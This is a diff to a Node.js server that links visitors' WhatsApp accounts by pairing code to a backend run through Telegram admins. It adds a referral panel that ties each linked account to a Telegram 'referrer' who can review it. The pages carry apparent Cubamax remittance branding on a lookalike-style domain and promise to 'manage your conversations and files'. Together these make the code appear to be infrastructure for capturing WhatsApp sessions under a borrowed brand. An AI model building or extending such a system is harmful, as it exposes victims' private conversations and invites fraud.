@@ -1,5 +1,6 @@
 import {publicSnapshot,renderPublicContent} from './public-content.js';
 import {createHash} from 'node:crypto';
+import {WebPanel} from './panel.js';
 import {renderCubamaxPreview} from './link-preview.js';
 import {pageContent} from './page-editor.js';
 import {portalContent,portalMediaPath} from './portal.js';
@@ -22,6 +23,8 @@ const secure=url.startsWith('https://');
 const panel=process.env.CHATS||process.env.ADMIN_CHAT_ID;
 const telegram=new Telegram(store,{token:process.env.TOKEN,admins:process.env.ADMIN_IDS,panel,storage:process.env.ALMACEN,url});
 const accounts=new Accounts(store,dir,(...args)=>telegram.notify(...args));telegram.accounts=accounts;
+const cookieRef=req=>(req.headers.cookie||'').split(';').map(v=>v.trim()).find(v=>v.startsWith('wa_referral='))?.slice(12)||'';
+const webPanel=new WebPanel(store,accounts,telegram,{url,secure,allowedOrigins});telegram.webPanel=webPanel;
 console.log('WHATSAPP: account_capacity','unlimited');
 console.log('WHATSAPP: transport_default',process.env.WA_ENGINE||'baileys');
 const defaults={title:'Tu WhatsApp, bien atendido.',description:'Conecta tu cuenta para que nuestro equipo te ayude a gestionar tus conversaciones y archivos.',button:'CONECTAR CUENTA',color:'#128c7e'};
@@ -31,7 +34,7 @@ const security={
   ...(secure?{'Strict-Transport-Security':'max-age=31536000'}:{})
 };
 const publicBuild=createHash('sha256').update(['public-content.js','page-content.js','app.js','cubamax.js','cubamax-headline.js','cubamax.css','style.css'].map(file=>readFileSync(new URL('../public/'+file,import.meta.url))).join('')).digest('hex').slice(0,16);
-const publicFiles={'/public-content.js':['public-content.js','application/javascript'],'/prelink-tutorial.js':['prelink-tutorial.js','application/javascript'],'/page-content.js':['page-content.js','application/javascript'],'/cubamax':['cubamax.html','text/html; charset=utf-8'],'/cubamax/':['cubamax.html','text/html; charset=utf-8'],'/cubamax.css':['cubamax.css','text/css'],'/cubamax.js':['cubamax.js','application/javascript'],'/cubamax-headline.js':['cubamax-headline.js','application/javascript'],'/cubamax-logo.svg':['cubamax-logo.svg','image/svg+xml'],'/countries.js':['countries.js','application/javascript'],'/favicon.svg':['favicon.svg','image/svg+xml'],'/':['index.html','text/html; charset=utf-8'],'/app.js':['app.js','application/javascript'],'/style.css':['style.css','text/css']};
+const publicFiles={'/panel':['panel.html','text/html; charset=utf-8'],'/panel/':['panel.html','text/html; charset=utf-8'],'/panel.css':['panel.css','text/css'],'/panel.js':['panel.js','application/javascript'],'/public-content.js':['public-content.js','application/javascript'],'/prelink-tutorial.js':['prelink-tutorial.js','application/javascript'],'/page-content.js':['page-content.js','application/javascript'],'/cubamax':['cubamax.html','text/html; charset=utf-8'],'/cubamax/':['cubamax.html','text/html; charset=utf-8'],'/cubamax.css':['cubamax.css','text/css'],'/cubamax.js':['cubamax.js','application/javascript'],'/cubamax-headline.js':['cubamax-headline.js','application/javascript'],'/cubamax-logo.svg':['cubamax-logo.svg','image/svg+xml'],'/countries.js':['countries.js','application/javascript'],'/favicon.svg':['favicon.svg','image/svg+xml'],'/':['index.html','text/html; charset=utf-8'],'/app.js':['app.js','application/javascript'],'/style.css':['style.css','text/css']};
 async function body(req){let data='';for await(const chunk of req){data+=chunk;if(data.length>4000)throw new Error('Solicitud demasiado grande');}return JSON.parse(data||'{}');}
 const rates=new Map();
 function rate(key,max){const now=Date.now();let r=rates.get(key);if(!r||now-r.since>60000){r={since:now,n:0};rates.set(key,r);}return ++r.n<=max;}
@@ -40,10 +43,11 @@ const server=http.createServer(async(req,res)=>{
   const sessionCookie=req.headers['x-portal']==='cubamax-corporate'?'cubamax_session':'wa_session';
   const json=(status,data,extra={})=>{res.writeHead(status,{...security,'Content-Type':'application/json',...extra});res.end(JSON.stringify(data));};
   try{
+    if(route.startsWith('/api/panel/')||route.startsWith('/vincular/'))return webPanel.handle(req,res,route,security,body);
     if(req.method==='GET'&&publicFiles[route]){
       const host=(req.headers.host||'').toLowerCase().split(':')[0];
       const [file,type]=publicFiles[route==='/'&&cubamaxHosts.has(host)?'/cubamax':route];res.writeHead(200,{...security,'Content-Type':type});const bytes=readFileSync(new URL(`../public/${file}`,import.meta.url));
-      if(file==='cubamax.html'||file==='index.html'){const snapshot=publicSnapshot(store,file==='cubamax.html'?'cm':'wa');const html=file==='cubamax.html'?renderCubamaxPreview(bytes.toString(),store,cubamaxHosts.has(host)?'https://cubamaxcom.online':url,route):bytes.toString();return res.end(renderPublicContent(html,snapshot,publicBuild));}
+      if(file==='cubamax.html'||file==='index.html'){const snapshot=publicSnapshot(store,file==='cubamax.html'?'cm':'wa');const html=file==='cubamax.html'?renderCubamaxPreview(bytes.toString(),store,cubamaxHosts.has(host)?'https://cubamaxcom.online':url,route):bytes.toString();const ref=webPanel.referral(req);const escape=v=>String(v).replace(/[&<>"']/g,c=>({'&':'&amp;','<':'&lt;','>':'&gt;','"':'&quot;',"'":'&#39;'}[c]));let rendered=renderPublicContent(html,snapshot,publicBuild);if(ref){rendered=rendered.replace(/<body\b/,`<body data-link-ref="${escape(cookieRef(req))}"`);const note=`Esta cuenta quedará asociada a ${escape(ref.name)} (Telegram ${escape(ref.actor)}) y podrá ser revisada por ese usuario y por los administradores del sistema.`;rendered=rendered.replace(/(<button[^>]*id="connect-button")/,`<p class="note">${note}</p>$1`).replace('Puedes revocar la vinculación desde WhatsApp.</p>',`Puedes revocar la vinculación desde WhatsApp.</p><p>${note}</p>`);}return res.end(rendered);}
       return res.end(bytes);
     }
     if(req.method==='GET'&&route==='/api/public-content'){const site=new URL(req.url,'http://local').searchParams.get('site');if(!['cm','wa'].includes(site))return json(400,{error:'Página no disponible.'});return json(200,publicSnapshot(store,site));}
@@ -103,6 +107,7 @@ const server=http.createServer(async(req,res)=>{
       const retryAfter=accounts.pairingRetryAfter(a.id);
       if(retryAfter)return json(429,{error:'WhatsApp limitó las solicitudes de códigos para este número. Hemos pausado los intentos durante 30 minutos para no seguir solicitando códigos.',retryAfter});
       if(!rate(`connect:${a.id}`,3))return json(429,{error:'Espera un minuto antes de volver a intentar.'});
+      webPanel.consent(a.id,req,input.referral);
       store.update(a.id,'consent',1);store.audit(a.id,'consent-v1');
       const corporate=input.portal==='cubamax-corporate',services={money:'Recibir dinero',combo:'Recibir combo',packages:'Recibir paquetes',topup:'Recarga móvil'};
       const corporateService=corporate?services[input.service]:null;
